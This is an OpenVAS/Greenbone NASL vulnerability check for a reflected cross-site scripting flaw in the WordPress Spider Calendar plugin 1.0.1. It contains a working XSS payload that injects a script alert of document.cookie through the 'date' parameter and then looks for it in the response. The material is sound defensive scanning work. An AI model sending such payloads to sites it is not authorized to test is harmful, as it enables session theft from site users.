# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802998");
  script_version("2024-06-27T05:05:29+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-10-18 11:07:20 +0530 (Thu, 18 Oct 2012)");
  script_name("WordPress Spider Calendar Plugin XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/50812");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55779");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/79042");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21715/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117078/WordPress-Spider-1.0.1-SQL-Injection-XSS.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Spider Calendar Plugin version 1.0.1");

  script_tag(name:"insight", value:"Input passed via the 'date' parameter to 'front_end/spidercalendarbig.php'
  is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Update to version 1.1.3 or later.");

  script_tag(name:"summary", value:"WordPress Spider Calendar Plugin is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/spider-calendar");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

foreach plugin (make_list("spider-calendar", "calendar")){

  url = dir + '/wp-content/plugins/' + plugin + '/front_end/' + 'spidercalendarbig.php?calendar_id=1&cur_page_url=&date="><script>alert(document.cookie)</script>';

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>")){
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
